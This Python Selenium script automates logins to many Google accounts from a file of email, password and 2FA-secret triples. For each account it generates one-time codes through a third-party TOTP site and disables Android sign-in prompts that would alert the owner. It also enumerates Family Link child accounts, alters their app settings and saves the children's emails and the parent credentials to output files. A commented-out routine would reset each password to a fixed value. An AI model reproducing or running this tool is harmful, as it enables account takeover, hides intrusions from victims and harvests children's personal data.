import os,string,random,re,sys,urllib,time
from seleniumbase import Driver
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.select import Select 
from selenium.webdriver.chrome.options import Options 
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import concurrent.futures

def generate_random_string():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(10))
def wait_and_click(driver, css_selector):
    try:
        element = WebDriverWait(driver, 20).until(  # Menunggu elemen sampai muncul (default 10 detik)
            EC.element_to_be_clickable((By.CSS_SELECTOR, css_selector))
        )
        element.click()  # Klik elemen setelah valid
    except TimeoutException:
        print("Element tidak ditemukan atau tidak bisa diklik.")

def wait_and_send(driver, css_selector, action):
    try:
        element = WebDriverWait(driver, 20).until(  # Menunggu elemen sampai muncul (default 10 detik)
            EC.element_to_be_clickable((By.CSS_SELECTOR, css_selector))
        )
        element.send_keys(action)  # Kirim input setelah valid
    except TimeoutException:
        print("Element tidak ditemukan atau tidak bisa di send.")

def login(email,password,sec_code):
    max_retries = 5
    attempt = 0
    
    while attempt <= max_retries:
        driver.get('https://myaccount.google.com/security')
        print("Login Email...")
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div > c-wiz > c-wiz > div > div.s7iwrf.gMPiLc.Kdcijb > div > div > c-wiz > section > div > div > div > div > div > div > header > div.m6CL9 > div'))).click()
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, 'identifier'))).send_keys(email)
        print("Email : "+email)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#identifierNext > div > button'))).click()
        time.sleep(2)
        try:
            WebDriverWait(driver, 7).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#password > div.aCsJod.oJeWuf > div > div.Xb9hP > input'))).send_keys(password)
            print("Password : "+password+"\n===================================")
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#passwordNext > div > button'))).click()
            print("Retive OTP Auth...")
            driver.execute_script("window.open('');")
            driver.switch_to.window(driver.window_handles[1])
            driver.get('https://totp.danhersam.com/#/'+sec_code)
            otp_auth = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#token'))).text
            print("OTP Auth : "+otp_auth)
            driver.close()
            driver.switch_to.window(driver.window_handles[0])
            print("Submit OTP Auth...")
            wait_and_send(driver, '#totpPin', otp_auth)
            time.sleep(1)
            wait_and_click(driver, '#totpNext > div > button')
            time.sleep(2)
            return True
        except:
            print("Captcha Require, Next Email...\n======================================")
            attempt += 1
            if attempt > max_retries:
                print("Max login attempts reached. Moving to the next email.")
                return False
def loqout():
    driver.get('https://accounts.google.com/SignOutOptions?hl=en&continue=https://myaccount.google.com/security&ec=GBRAwAE')
    time.sleep(2)
    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#signout'))).click()

def change_password():
    while True:
        try:
            driver.get('https://myaccount.google.com/signinoptions/password')
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i6'))).send_keys('123456tujuh@')
            time.sleep(1)
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i12'))).send_keys('123456tujuh@')
            time.sleep(1)
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.F2KCCe.NkyfNe.Z2xVec.E2bpG.injfOc > form > div > div.GFJYae.lY6Rwe > div > div > button'))).click()
            return True
        except:
            return False

def prom():
    print("Disable Prompts Android")
    try:
        driver.get('https://myaccount.google.com/connections/settings')
        ele = WebDriverWait(driver,5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.Z54xyc > div > div > div > div > ul > li:nth-child(1) > div > div.kvjuQc.biRLo > div > button')))
        if ele.get_attribute('aria-checked') == "true":
            print("Status : Active")
            ele.click()
            print("Trying Disable Prompts...")
        else:
            print("Status : Disable")
        return True
    except Exception as e:
        print(e)
        print("Function Prompts Error")

def family():
    driver.get("https://myaccount.google.com/family/details?hl=en_US")
    for i in range(3,8):
        href_links.append(WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, f'#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > c-wiz > div > div.s7iwrf.gMPiLc > div > div > c-wiz > section > div:nth-child(1) > div > div > div:nth-child({str(i)}) > div.VfPpkd-ksKsZd-XxIAqe.CmhoVd.I6g62c > a'))).get_attribute('href').split('/g/')[-1])
    print(href_links)
    for i in range(len(href_links)):
        driver.get(f"https://families.google.com/familylink/kids/{str(href_links[i])}/settings/thirdpartyapps?webview=true&hideNavBar=true&hl=en_US")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz.zQTmif.SSPGKf > div > div.M4P19c > div.jz7BQc > div > main > section > c-wiz > div > div:nth-child(2) > div'))).click()
        time.sleep(1)
    for i in range(len(href_links)):
        driver.get(f"https://myaccount.google.com/family/member/g/{str(href_links[i])}?hl=en_US")
        mail_list.append(WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.F2KCCe.NkyfNe.HYI7Re.Z2xVec.E2bpG.injfOc > div > div > div > div > div > p:nth-child(2)'))).text)
        time.sleep(0.5)
    print(mail_list)


with open('list.txt', 'r') as file:
    emails = file.readlines()

failed_logins = []


while emails:
    href_links = []
    mail_list = []
    email = emails[0].replace('\n', '')
    
    if not email:
        break
    
    if email in failed_logins:
        emails.pop(0)
        continue
    
    bacot = re.split(r'[|:;]', email.strip())

    driver = Driver(uc=True)
    
    if login(bacot[0], bacot[1], bacot[2]):
        time.sleep(5)
        prom()
        time.sleep(2)
        # mail_reco = recovery_email()
        family()
        for i in range(len(mail_list)):
            with open('result_anak.txt', 'a') as result_file:
                result_file.write(f"{mail_list[i]}|{bacot[0]}\n")
        with open('result_ortu.txt', 'a') as result_file:
            result_file.write(f"{bacot[0]}|{bacot[1]}|{bacot[2]}\n")
        # change_password()
        time.sleep(2)
        loqout()

        time.sleep(2)
        
        emails.pop(0)
        
        with open('list.txt', 'w') as file:
            file.writelines(emails)
    else:
        failed_logins.append(email)


    
    driver.quit()


print("Done All")

# with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
#     executor.map(main, [urls] * 5)